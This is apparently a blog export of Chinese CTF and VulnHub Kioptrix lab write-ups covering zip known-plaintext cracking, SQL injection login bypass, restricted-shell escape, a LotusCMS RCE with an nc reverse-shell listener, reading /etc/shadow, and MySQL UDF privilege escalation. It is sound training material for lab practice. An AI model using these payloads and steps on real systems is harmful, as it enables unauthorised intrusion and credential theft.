<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023春秋杯_Misc</title>
    <url>/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/</url>
    <content><![CDATA[<h1 id="谁偷了我的外卖"><a href="#谁偷了我的外卖" class="headerlink" title="谁偷了我的外卖"></a>谁偷了我的外卖</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ul>
<li>小凯最近入职了大厂，但是在工作途中出现了一些麻烦事，怎么办呢</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>拿到手是一张jpg</li>
</ul>
<img lazyload src="/images/loading.svg" data-src="2023春秋杯-Misc/小凯.jpg" alt="小凯" style="zoom:33%;">

<ul>
<li>binwalk分析一下，发现里面有个压缩包，binwalk -e 不管用，foremost提取一下</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304160239092.png" alt="image-20240304160239092"></p>
<ul>
<li>010里还有个提示：<code>I can give you a hint: - = / But there was a takeaway that was partially eaten.</code></li>
<li>拿到压缩包，是加密的，里面是一个flag文件夹和很多“外卖”文件</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304160712556.png" alt="image-20240304160712556"></p>
<p><strong>观察发现有序的且“_”后面的4个字符很像base64，再加上前面有序号，以及提示信息，很容易猜测是要把这些按顺序组合成一段base64</strong></p>
<ul>
<li>我先随便提取一下，形成一个文件夹，这样虽然文件是空的，但是文件名都在，再利用批量处理文件夹名称，再利用python</li>
</ul>
<p><strong>能发现第一个少了四个字母</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304161318875.png" alt="处理文件夹文件名称"></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding =gbk</span></span><br><span class="line"><span class="keyword">from</span> natsort <span class="keyword">import</span> ns, natsorted</span><br><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line">folder = <span class="string">r&quot;/Users/madison/Desktop/wmx&quot;</span></span><br><span class="line">files = os.listdir(folder)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">files_1 = natsorted(files,alg=ns.PATH)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files_1:</span><br><span class="line">    flag+=i</span><br><span class="line">lst = re.findall(<span class="string">&#x27;_([\w|+|=|-]&#123;4&#125;)&#x27;</span>,flag)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">str</span>+=i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<p><strong>先把第2个文件开始的提取出来</strong></p>
<ul>
<li>base64解码，可以在末尾发现应该是压缩包</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304161819149.png" alt="image-20240304161819149"></p>
<ul>
<li>补上文件头<code>504b03</code>的base64:<code>UEsD</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162516972.png" alt="image-20240304162516972"></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162720172.png" alt="image-20240304162720172"></p>
<p><strong>成功拿到download.zip</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162046748.png" alt="image-20240304162046748"></p>
<p><strong>这两个文件就是之前加密压缩包flag文件夹里的两个文件，还差一个txt.galf，这个明显就是flag.txt反过来</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162147928.png" alt="image-20240304162147928"></p>
<ul>
<li>查看这两个文件<ul>
<li>md文件里有一半的flag<code>flag&#123;W1sh_y0u_AaaAaaaa</code>，钥匙.png是一张用<strong>bandizip</strong>压缩文件的图，使用的算法是<strong>ZipCrypto</strong>，猜测要使用明文爆破bkcrack了</li>
</ul>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304162805829.png" alt="image-20240304162805829"></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304163109001.png" alt="image-20240304163109001"></p>
<ul>
<li><p>用bandizip压缩提取出来的md或png，记住要<strong>选用zipcrypto算法</strong>，算法需要一致，这里以压缩png为例，压缩成crack.zip</p>
</li>
<li><p>用bkcrack明文爆破出密钥</p>
</li>
</ul>
<p>-C 对应待解密的压缩包，-c为待解密压缩包里的某个加密文件，-P为明文压缩包，-p为已知的明文文件或明文信息</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C wmx.zip -c 外卖箱/flag/小凯的奋斗故事.md -P crack.zip -p 小凯的奋斗故事.md</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="./image-20240304164507564.png" alt="image-20240304164507564"></p>
<p><strong>拿到密钥：48ff002a 56e00484 380c5c49</strong></p>
<ul>
<li>利用密钥破解</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C wmx.zip -k 48ff002a 56e00484 380c5c49 -U new.zip 1234 </span><br></pre></td></tr></table></figure></div>

<p>-k为密钥，-U为你设置的新的zip，和新zip的密码（会把原来的zip里的东西复制到new.zip中，并且new.zip的密码被覆盖为1234）</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304164738068.png" alt="image-20240304164738068"></p>
<ul>
<li>成功提取并打开txt.galf</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304164841781.png" alt="image-20240304164841781"></p>
<ul>
<li>结合文件名以及上半部分的flag，可知，文本内容需要倒置过来</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="明文混淆（复现）"><a href="#明文混淆（复现）" class="headerlink" title="明文混淆（复现）"></a>明文混淆（复现）</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><ul>
<li>小明新买了一台windows电脑，给了小文一个经过两层混淆的webshell，，但压缩包密码搞忘了。听说webshell密码是一个叫flag的东西。。。</li>
</ul>
<h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>压缩包是加密的，一一排除伪加密，暴力破解，剩下明文爆破</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304203835579.png" alt="image-20240304203835579"></p>
<ul>
<li>bkcrack先查看一下压缩包的加密算法：<code>bkcrack -L</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304203726863.png" alt="image-20240304203726863"></p>
<p><strong>果然是ZipCrypto，明晃晃的明文爆破了</strong></p>
<ul>
<li>从LICENSE.txt 入手，所有的LICENSE.txt，都有换行，把明文设置为12个以上的空格</li>
<li>bkcrack爆破</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304211905788.png" alt="image-20240304211905788"></p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304211926934.png" alt="image-20240304211926934"></p>
<ul>
<li>提取出shell2.php，解混淆</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240304212121097.png" alt="image-20240304212121097"></p>
<p><em>php解混淆知识有待加强:sob:</em></p>
]]></content>
      <categories>
        <category>CTF做题记录</category>
      </categories>
      <tags>
        <tag>MISC-压缩包</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix Level 1.3(#4)</title>
    <url>/2024/03/05/Kioptrix-Level-1-3/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-1-3-4"><a href="#Kioptrix-Level-1-3-4" class="headerlink" title="Kioptrix Level 1.3(#4)"></a>Kioptrix Level 1.3(#4)</h1><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
<li>IP为<code>192.168.89.141</code></li>
<li>nmap扫描端口以及端口服务</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 22:04 EST</span><br><span class="line">Nmap scan report for 192.168.89.141</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 39528 closed tcp ports (conn-refused), 26003 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 32.68 seconds</span><br></pre></td></tr></table></figure></div>

<p>开放了ssh、http、samba</p>
<ul>
<li>开放了80，那就先dirsearch扫扫看：<code>dirsearch --url http://192.168.89.141 </code>，同时浏览器访问 <code>http://192.168.89.141</code></li>
</ul>
<img lazyload src="/images/loading.svg" data-src="Kioptrix-Level-1-3/image-20240305204216081.png" alt="image-20240305204216081" style="zoom:50%;">

<ul>
<li>看到了smb服务且80端口需要用户信息，那么就用enum4linux扫扫</li>
</ul>
<blockquote>
<p>enum4linux的介绍：<a class="link" href="https://blog.csdn.net/qq_63844103/article/details/127219997">【网安神器篇】——enum4linux枚举工具-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>比较全的扫描方法：<code>enum4linux -a -o &lt;ip&gt;</code>，这里主要看他的用户信息：<code>enum4linux -U 192.168.89.141</code>(<em>主要是因为http里面涉及到用户登录</em>)</p>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305203732012.png" alt="image-20240305203732012"></p>
<p>能看到一些用户信息，主要有loneferret、john、robert、root、nobody</p>
<ul>
<li>80端口是个登录界面，先试试能不能简单sql注入，随便在Username里输入<code>admin</code>，在Password里输入<code>&#39;or&#39;1&#39;=&#39;1&#39;</code>，发现还真能注入:laughing:</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305204504698.png" alt="image-20240305204504698"></p>
<ul>
<li>回显了一个User信息，但估计这个admin用户不在members里面，简单探索到这里，看看dirsearch什么结果</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305204622062.png" alt="image-20240305204622062"></p>
<ul>
<li>dirsearch其实也没什么特别的，/checklogin就是一个页面没什么信息，/database.sql是个sql文件，但是我们能在里面看到有一个<code>john</code>在members表里面密码是<code>1234</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305204912967.png" alt="image-20240305204912967"></p>
<ul>
<li>但是拿这个密码登录失败了，看来是修改过，无所谓，我会注入，输入上面一样的注入密码<code>&#39;or&#39;1&#39;=&#39;1</code>，轻松登录，拿到了john的真实密码<code>MyNameIsJohn</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305205101931.png" alt="image-20240305205101931"></p>
<ul>
<li>同样的方式，看看能不能拿到root、nobody、loneferret、robert的密码，最后只拿到了robert的密码<code>ADGAdsafdfwt4gadfga==</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305205720214.png" alt="image-20240305205720214"></p>
<ul>
<li>ssh 连接用户，但是发现两个用户都在受限的shell里面（以john为例），根据提示<code>Type &#39;?&#39; or &#39;help&#39; to get the list of allowed commands</code>，输入一个<code>?</code>发现能执行的命令很有限：<code>cd clear echo exit help ll lpath ls</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305210854321.png" alt="image-20240305210854321"></p>
<h4 id="信息搜集总结"><a href="#信息搜集总结" class="headerlink" title="信息搜集总结"></a>信息搜集总结</h4><ul>
<li>发现了登录界面的sql注入，通过简单注入，拿到了john和robert两个用户的密码</li>
<li>利用拿到的密码，通过ssh，远程登录了主机，但在受限的shell环境里，==下一步需要绕过限制，如果只是普通用户权限，还需要考虑提权==</li>
</ul>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="echo绕过受限的shell"><a href="#echo绕过受限的shell" class="headerlink" title="echo绕过受限的shell"></a>echo绕过受限的shell</h4><ul>
<li>这种受限的shell称为lshell(limited shell)，执行的命令优有限，但是lshell关于<code>echo</code>存在一个漏洞，我们可以通过<code>echo os.system(&quot;/bin/bash&quot;)</code>，绕过限制。</li>
</ul>
<blockquote>
<p>lshell绕过限制：<a class="link" href="https://www.aldeid.com/wiki/Lshell">Lshell - 醛 (aldeid.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><em>文章中还提到了通过vim命令绕过的方法</em></p>
</blockquote>
<ul>
<li>输入命令，成功绕过，可以执行很多命令，但我们还是普通用户权限</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305212141847.png" alt="image-20240305212141847"></p>
<h4 id="查看网站源代码"><a href="#查看网站源代码" class="headerlink" title="查看网站源代码"></a>查看网站源代码</h4><ul>
<li>回到80端口的思路，看看网站源码，试试看login的校验，于是查看<code>checklogin.php</code>，发现了mysql用户root，没有密码，好家伙😄</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305212754868.png" alt="image-20240305212754868"></p>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="MySQLUDF提权"><a href="#MySQLUDF提权" class="headerlink" title="MySQLUDF提权"></a>MySQLUDF提权</h4><ul>
<li>先用root登录mysql：<code>mysql -u root</code>，发现mysql的版本是<code>5.0.51a</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305213255453.png" alt="image-20240305213255453"></p>
<p>==接下来的思路就是看看能不能利用mysql提权==</p>
<p><em>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。<strong>由于MySQL这里正好&lt;5.1,我们可以直接尝试UDF提权</strong></em></p>
<blockquote>
<p><a class="link" href="https://www.sqlsec.com/2020/11/mysql.html#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90">MySQL 漏洞利用与提权 | 国光 (sqlsec.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.cnblogs.com/miansj/p/13996110.html">Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li>在mysql数据库下输入命令<code>create function sys_eval returns string soname &#39;lib_mysqludf_sys.so&#39;;</code>，<strong>sys_eval可以执行系统命令并在屏幕上显示</strong>，<code>select * from mysql.func</code>查看是否创建成功</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305214900539.png" alt="image-20240305214900539"></p>
<p><strong>成功创建</strong></p>
<ul>
<li>利用sys_eval实现系统命令，我们直接来修改root密码，<code>select sys_eval(&quot;sudo passwd root&quot;)</code>，然后直接设置root的新密码，再登录，成功拿到root</li>
</ul>
<p><em>后来发现sys_exec也可以执行系统命令，但是他无法打印在屏幕上，也无法交互，所以可以用来修改一些权限，比如<code>chmod u+x /bin/bash</code>或者用usermod修改用户所在的组，提权</em> </p>
<blockquote>
<p><a class="link" href="https://shifty0g.github.io/postsKioptrix-level-4/">Kioptrix Level 1.3 (#4) - Vulnhub | @shifty0g <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://juejin.cn/post/7291291581574529078#heading-6">【Vulnhub通关】Kioptrix: Level 1.3 (#4) - 掘金 (juejin.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240305220016944.png" alt="image-20240305220016944"></p>
<h2 id="学习总结与参考链接"><a href="#学习总结与参考链接" class="headerlink" title="学习总结与参考链接"></a>学习总结与参考链接</h2><ul>
<li>enum4linux的使用场景</li>
</ul>
<blockquote>
<p> enum4linux的介绍：<a class="link" href="https://blog.csdn.net/qq_63844103/article/details/127219997">【网安神器篇】——enum4linux枚举工具-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li><p>涉及到80端口，可以先扫起来，然后去搜集信息，拿到shell之后，<strong>要先查看源代码</strong>，看看有没有漏掉的信息</p>
</li>
<li><p>受限shell绕过方法：echo</p>
</li>
</ul>
<blockquote>
<p>lshell绕过限制：<a class="link" href="https://www.aldeid.com/wiki/Lshell">Lshell - 醛 (aldeid.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li>mysql中的udf提权，<strong>mysql还有很多种提权方式有待学习</strong></li>
</ul>
<blockquote>
<p><a class="link" href="https://www.sqlsec.com/2020/11/mysql.html#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90">MySQL 漏洞利用与提权 | 国光 (sqlsec.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li>参考walkthrough</li>
</ul>
<blockquote>
<p><a class="link" href="https://shifty0g.github.io/posts/kioptrix-level-4/">Kioptrix Level 1.3 (#4) - Vulnhub | @shifty0g <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://juejin.cn/post/7291291581574529078#heading-6">【Vulnhub通关】Kioptrix: Level 1.3 (#4) - 掘金 (juejin.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>类OSCP靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix Level 1.2(#3)</title>
    <url>/2024/02/11/Kioptrix_Level_1.2/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-1-2-3"><a href="#Kioptrix-Level-1-2-3" class="headerlink" title="Kioptrix Level 1.2(#3)"></a>Kioptrix Level 1.2(#3)</h1><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
<li>nmap扫描ip，得到IP为<code>192.168.89.139</code></li>
<li>nmap扫描端口以及端口服务</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 00:12 EST</span><br><span class="line">Nmap scan report for 192.168.89.139</span><br><span class="line">Host is up (0.0025s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds</span><br></pre></td></tr></table></figure></div>

<p>发现开放了ssh和http服务</p>
<ul>
<li>浏览器访问<code>http://192.168.89.139</code></li>
</ul>
<img lazyload src="/images/loading.svg" data-src="Kioptrix_Level_1.2/截屏2024-02-13_下午8.24.57.png" alt="截屏2024-02-13_下午8.24.57" style="zoom:67%;">

<ul>
<li>点击Login，发现一个登录界面，<code>Proudly Powered by:LotusCMS</code>，<strong>LotusCMS</strong>是关键，CMS（Content  Management System 内容管理系统）</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.25.32.png" alt="截屏2024-02-13_下午8.25.32"></p>
<p><em>看到登录框，想起上一道题，可能存在sql注入</em></p>
<ul>
<li>dirsearch扫描网址：<code>dirsearch --url http://192.168.89.139</code></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.36.19.png" alt="截屏2024-02-13_下午8.36.19"></p>
<p><strong>发现了一个phpmyadmin，还有一个gallery</strong></p>
<ul>
<li>查看<code>http://192.168.89.139/phpmyadmin/</code>，<strong>需要拿到root密码</strong></li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.57.06.png" alt="截屏2024-02-13_下午9.57.06"></p>
<p>*由之前信息收集阶段的结果可知 phpmyadmin 的版本为 <strong>2.11.3</strong>，搜索可知该版本存在”万能密码”,使用 <strong>‘localhost’@‘@”</strong> 即可登陆，但是只有一个 <strong>information_schema</strong> ，没什么用*</p>
<blockquote>
<p><a class="link" href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#lotuscms">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<ul>
<li>查看<code>http://192.168.89.139/gallery/</code>，dirsearch扫一下目录</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.58.54.png" alt="截屏2024-02-13_下午8.58.54"></p>
<ul>
<li>发现了一个后台/gallery/gadmin，<strong>Username为admin</strong>，一个db.sql文件<img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.00.18.png" alt="截屏2024-02-13_下午9.00.18"></li>
</ul>
<p><strong>后台可以尝试sql注入</strong></p>
<p><strong>db.sql部分文件内容如下：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `gallarific_users` (</span><br><span class="line">  `userid` int(11) NOT NULL auto_increment,</span><br><span class="line">  `username` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `password` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `usertype` enum(&#x27;superuser&#x27;,&#x27;normaluser&#x27;) NOT NULL default &#x27;superuser&#x27;,</span><br><span class="line">  `firstname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `lastname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `email` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `datejoined` int(11) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `website` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `issuperuser` tinyint(4) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `photo` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `joincode` varchar(20) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  PRIMARY KEY  (`userid`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<h4 id="总结突破方向——cms-web"><a href="#总结突破方向——cms-web" class="headerlink" title="总结突破方向——cms+web"></a>总结突破方向——cms+web</h4><ul>
<li><p>Login是否存在sql注入</p>
</li>
<li><p>LotusCMS 是否存在可利用的漏洞</p>
</li>
<li><p>是否能拿到phpmyadmin后台的root用户密码，查看数据库信息</p>
</li>
<li><p>/gallery/gadmin是否存在sql注入</p>
</li>
</ul>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="lotusCMS漏洞利用"><a href="#lotusCMS漏洞利用" class="headerlink" title="lotusCMS漏洞利用"></a>lotusCMS漏洞利用</h4><ul>
<li><p>在github中找到python利用的lotuscms3.0RCE漏洞：<a class="link" href="https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit">https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>nc监听444端口:<code> nc -nvlp 444</code>，同时执行<code> python lotuscms.py -rh 192.168.89.139 -lh 192.168.89.137</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help  show this help message and exit.</span><br><span class="line">-rh RHOST   Target Host.</span><br><span class="line">-rp RPORT   Target Port. Default: 80.</span><br><span class="line">-u URI      URI (i.e /lms/. Default: /</span><br><span class="line">-lh LHOST   Local Host.</span><br><span class="line">-lp LPORT   Local Port. Default: 444</span><br><span class="line">-s          SSL/TLS enable (True/False). Default: False</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="./image-20240229153523165.png" alt="image-20240229153523165"></p>
<p><strong>成功拿到www-data，但是这只是一个普通用户权限，由于我们扫出了重要的网站后台，先利用这个用户权限，查看网站源文件，看是否存在敏感信息</strong></p>
</li>
<li><p>通过www-data，我们可以查看/etc/passwd /etc/shadow，这些信息，<em>里面能看到后面能查到的dreg和loneferret两个用户</em></p>
</li>
<li><p>在网页根目录中查找敏感信息，通过<code>cat gconfig.php</code>成功看到mysql的username和password，可以直接登录phpmyadmin了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>拿到phpmyadmin后台root密码后，登录后台，看到一些<strong>数据库信息</strong></p>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.34.41.png" alt="截屏2024-02-13_下午8.34.41"></p>
<ul>
<li>可以看到我们要找的gallery数据库，gallarific_users这张表，也就是gallery/gadmin后台的登录用户名和密码</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.15.57.png" alt="截屏2024-02-13_下午9.15.57"></p>
<p><strong>拿到password <code>n0t7t1k4</code></strong></p>
<p>利用<code>admin </code>和<code>n0t7t1k4</code>登录网站后台gallery/gadmin，但是发现网站里面，没有什么特别的东西，<em>其实可以看到一些上传功能和评论功能，可以试试，这里不赘述。</em></p>
<ul>
<li>继续翻找phpmyadmin，发现了一个叫做dev_accounts的表，里面存了username和password，这两个用户我们在之前通过www-data，查看用户列表时看到过，因此如果破解了密码可以利用<code>ssh</code>登录</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="./image-20240229194301766.png" alt="image-20240229194301766"></p>
<ul>
<li>通过<code>md5</code>解密，得到账户信息 [md5在线解密](<a class="link" href="https://www.cmd5.com/default.aspx?hashtype=md5&answer=cWluZ21pbmcxMTI0MTUu">md5在线解密破解,md5解密加密 (cmd5.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dreg Mast3r</span><br><span class="line">loneferret starwars</span><br></pre></td></tr></table></figure></div>

<p><em>看到别人的walkthrough发现这里也可以hydra爆破，详情请看  <a class="link" href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p>
<ul>
<li>目标主机开了ssh服务，尝试利用ssh登录</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss dreg@192.168.89.139</span><br><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.89.139</span><br></pre></td></tr></table></figure></div>

